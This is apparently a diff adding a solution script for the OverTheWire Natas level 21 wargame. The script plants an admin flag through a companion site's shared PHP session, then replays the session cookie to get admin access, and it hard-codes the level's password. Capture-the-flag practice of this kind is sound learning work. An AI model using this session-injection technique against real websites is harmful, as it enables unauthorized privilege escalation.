@@ -1,0 +1,19 @@
+natas21:89OWrTkGmiLZLv12JY4tLj2c4FW0xn56
+
+import requests
+
+url = 'http://natas21-experimenter.natas.labs.overthewire.org'
+auth = ('natas21', '89OWrTkGmiLZLv12JY4tLj2c4FW0xn56')
+
+params = dict(debug='', submit='', admin=1)
+
+cookies = dict()
+r = requests.get(url, auth=auth, params=params, cookies=cookies)
+phpsessid = r.cookies['PHPSESSID']
+print(r.text)
+
+url = 'http://natas21.natas.labs.overthewire.org'
+params = dict(debug='')
+cookies = dict(PHPSESSID=phpsessid)
+r = requests.get(url, auth=auth, params=params, cookies=cookies)
+print(r.text)
